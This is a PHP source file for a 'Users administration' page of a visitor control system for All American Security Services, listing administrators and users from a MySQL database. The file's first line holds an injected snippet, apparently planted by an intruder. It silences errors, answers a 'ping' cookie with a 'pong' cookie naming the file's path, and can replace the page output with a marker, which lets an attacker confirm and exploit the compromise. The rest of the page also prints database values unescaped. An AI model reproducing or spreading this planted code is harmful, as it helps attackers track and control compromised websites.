<? $frt=1;error_reporting(0);if(isset($_COOKIE["ping"])){@setcookie("pong","./cynergi/admin/users_admin.php",time()+3600,"/");if( $_COOKIE["ping"]=="./cynergi/admin/users_admin.php"){if( !function_exists("ob_sh") ){function ob_sh($buffer){if( preg_match("@<body|</body@si",$buffer) ){return "GOOO->./cynergi/admin/users_admin.php<-";}return "NotGO->./cynergi/admin/users_admin.php<-";}}@ob_start("ob_sh");}}$frt=2;?><?php require_once('../Connections/dplace.php'); ?>
<?php
if (!isset($_SESSION)) {
  session_start();
}
$MM_authorizedUsers = "";
$MM_donotCheckaccess = "true";

// *** Restrict Access To Page: Grant or deny access to this page
function isAuthorized($strUsers, $strGroups, $UserName, $UserGroup) { 
  // For security, start by assuming the visitor is NOT authorized. 
  $isValid = False; 

  // When a visitor has logged into this site, the Session variable MM_Username set equal to their username. 
  // Therefore, we know that a user is NOT logged in if that Session variable is blank. 
  if (!empty($UserName)) { 
    // Besides being logged in, you may restrict access to only certain users based on an ID established when they login. 
    // Parse the strings into arrays. 
    $arrUsers = Explode(",", $strUsers); 
    $arrGroups = Explode(",", $strGroups); 
    if (in_array($UserName, $arrUsers)) { 
      $isValid = true; 
    } 
    // Or, you may restrict access to only certain users based on their username. 
    if (in_array($UserGroup, $arrGroups)) { 
      $isValid = true; 
    } 
    if (($strUsers == "") && true) { 
      $isValid = true; 
    } 
  } 
  return $isValid; 
}

$MM_restrictGoTo = "index.php";
if (!((isset($_SESSION['MM_Username'])) && (isAuthorized("",$MM_authorizedUsers, $_SESSION['MM_Username'], $_SESSION['MM_UserGroup'])))) {   
  $MM_qsChar = "?";
  $MM_referrer = $_SERVER['PHP_SELF'];
  if (strpos($MM_restrictGoTo, "?")) $MM_qsChar = "&";
  if (isset($QUERY_STRING) && strlen($QUERY_STRING) > 0) 
  $MM_referrer .= "?" . $QUERY_STRING;
  $MM_restrictGoTo = $MM_restrictGoTo. $MM_qsChar . "accesscheck=" . urlencode($MM_referrer);
  header("Location: ". $MM_restrictGoTo); 
  exit;
}
?>
<?php
if (!function_exists("GetSQLValueString")) {
function GetSQLValueString($theValue, $theType, $theDefinedValue = "", $theNotDefinedValue = "") 
{
  if (PHP_VERSION < 6) {
    $theValue = get_magic_quotes_gpc() ? stripslashes($theValue) : $theValue;
  }

  $theValue = function_exists("mysql_real_escape_string") ? mysql_real_escape_string($theValue) : mysql_escape_string($theValue);

  switch ($theType) {
    case "text":
      $theValue = ($theValue != "") ? "'" . $theValue . "'" : "NULL";
      break;    
    case "long":
    case "int":
      $theValue = ($theValue != "") ? intval($theValue) : "NULL";
      break;
    case "double":
      $theValue = ($theValue != "") ? doubleval($theValue) : "NULL";
      break;
    case "date":
      $theValue = ($theValue != "") ? "'" . $theValue . "'" : "NULL";
      break;
    case "defined":
      $theValue = ($theValue != "") ? $theDefinedValue : $theNotDefinedValue;
      break;
  }
  return $theValue;
}
}

$colname_usuario = "-1";
if (isset($_SESSION['MM_Username'])) {
  $colname_usuario = $_SESSION['MM_Username'];
}
mysql_select_db($database_dplace, $dplace);
$query_usuario = sprintf("SELECT * FROM tbl_admins WHERE username = %s", GetSQLValueString($colname_usuario, "text"));
$usuario = mysql_query($query_usuario, $dplace) or die(mysql_error());
$row_usuario = mysql_fetch_assoc($usuario);
$totalRows_usuario = mysql_num_rows($usuario);

mysql_select_db($database_dplace, $dplace);
$query_usuarios = "SELECT * FROM tbl_users ORDER BY `names` ASC";
$usuarios = mysql_query($query_usuarios, $dplace) or die(mysql_error());
$row_usuarios = mysql_fetch_assoc($usuarios);
$totalRows_usuarios = mysql_num_rows($usuarios);

mysql_select_db($database_dplace, $dplace);
$query_adm = "SELECT * FROM tbl_admins ORDER BY `names` ASC";
$adm = mysql_query($query_adm, $dplace) or die(mysql_error());
$row_adm = mysql_fetch_assoc($adm);
$totalRows_adm = mysql_num_rows($adm);
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><!-- InstanceBegin template="/Templates/templateadmin.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<!-- InstanceBeginEditable name="doctitle" -->
<title>All American Security Services</title>
<!-- InstanceEndEditable -->
<!-- InstanceBeginEditable name="head" -->
<!-- InstanceEndEditable -->
<link href="../css/style.css" rel="stylesheet" type="text/css" />
<style type="text/css">
<!--
body {
	background-image: url(../images/bgnd2.jpg);
	background-repeat: repeat-x;
}
-->
</style>
<script type="text/javascript" id="sothink_dhtmlmenu"> <!--
 st_siteroot="";
 st_jspath="stmenu.js";
 if(!window.location.href.indexOf("file:") && st_jspath.charAt(0)=="/")
  document.write('<script type="text/javascript" src="'+st_siteroot+st_jspath+'"><\/script>');
 else 
  document.write('<script type="text/javascript" src="'+st_jspath+'"><\/script>');
//--> </script></head>

<body>
<table width="627" height="132" border="0" align="center">
  <tr>
    <td width="232" height="128" align="center"><img src="../images/dplace_logo.JPG" alt="" width="175" height="87" /></td>
    <td width="385" align="center"><span class="titulo">Visitor control system <br />
      All American Security Services</span></td>
  </tr>
</table>
<table width="673" border="0" align="center">
  <tr>
    <td width="362" align="center"><span> &nbsp;
      <script type="text/javascript" src="adminis.js"></script>
    </span></td>
  </tr>
</table>
<!-- InstanceBeginEditable name="central" --><br />
<table width="600" border="0" align="center">
  <tr>
    <td align="center" class="titulo">Users administration</td>
  </tr>
</table>
<br />
<table width="816" height="367" border="0" align="center">
  <tr>
    <td align="center" valign="top"><br />
      <table width="600" border="0" align="center">
        <tr>
          <td width="234" align="center"><a href="new_user.php">Create New user</a></td>
          <td width="207" align="center"><a href="new_admin.php">Create new administrator</a></td>
          <td width="145" align="center"><a href="msgs_sent.php?id_admin=<?php echo $row_usuario['id_admin']; ?>">Sent messages</a></td>
        </tr>
      </table>
      <p class="caja_search">Administrators</p>
      <table width="603" border="1">
        <tr class="etiqueta">
          <td width="172">Name:</td>
          <td width="220">Username:</td>
          <td width="189">Change password</td>
        </tr>
        <?php do { ?>
          <tr>
            <td><?php echo $row_adm['names']; ?></td>
            <td><?php echo $row_adm['username']; ?></td>
            <td align="center"><a href="pass_edit_adm.php?id=<?php echo $row_adm['id_admin']; ?>"><img src="../images/lock.png" width="40" height="40" border="0" /></a></td>
          </tr>
          <?php } while ($row_adm = mysql_fetch_assoc($adm)); ?>
      </table>
      <p><span class="caja_search">Users</span></p>
      <table width="685" border="1">
        <tr class="etiqueta">
          <td width="174">Name:</td>
          <td width="220">Username</td>
          <td width="122" align="center">Send Message</td>
          <td width="141" align="center">Change password</td>
        </tr>
        <?php do { ?>
          <tr>
            <td class="linea"><?php echo $row_usuarios['names']; ?></td>
            <td class="linea"><?php echo $row_usuarios['username']; ?></td>
            <td align="center"><a href="msgs.php?id_guard=<?php echo $row_usuarios['id_user']; ?>"><img src="../images/msgs.jpg" width="45" height="49" border="0" /></a></td>
<td align="center"><a href="pass_edit.php?id=<?php echo $row_usuarios['id_user']; ?>"><img src="../images/lock.png" width="40" height="40" border="0" /></a></td>
          </tr>
          <?php } while ($row_usuarios = mysql_fetch_assoc($usuarios)); ?>
      </table></td>
  </tr>
</table>
<br />
<!-- InstanceEndEditable -->
<table width="200" border="0" align="right">
  <tr>
    <td>User: <?php echo $row_usuario['names']; ?></td>
  </tr>
</table>
</body>
<!-- InstanceEnd --></html>
<?php
mysql_free_result($usuario);

mysql_free_result($usuarios);

mysql_free_result($adm);
?>
